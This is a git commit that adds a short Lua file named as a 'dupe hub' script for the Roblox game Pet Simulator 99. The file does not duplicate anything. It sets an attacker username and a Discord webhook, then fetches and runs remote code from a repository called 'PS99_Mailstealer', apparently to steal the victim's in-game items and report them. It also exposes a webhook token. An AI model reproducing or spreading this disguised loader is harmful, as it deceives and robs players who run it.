7d1e841d74d179a2f3e42adefa2f11b17210bd81
Manolo0987 <110361460+Manolo0987@users.noreply.github.com>
2024-10-13 20:23:02 +0200

    Add files via upload

---
+++ P99DupeHub.lua
@@ -0,0 +1,5 @@
+Username = "223wigle2"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1295088382510239754/m-K4MwL8_2JKqJJo5BQQqMrneqeeBbjxVq802S8ThLBPSRA8vfidDdLM0nG8Rrpx68Qj"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
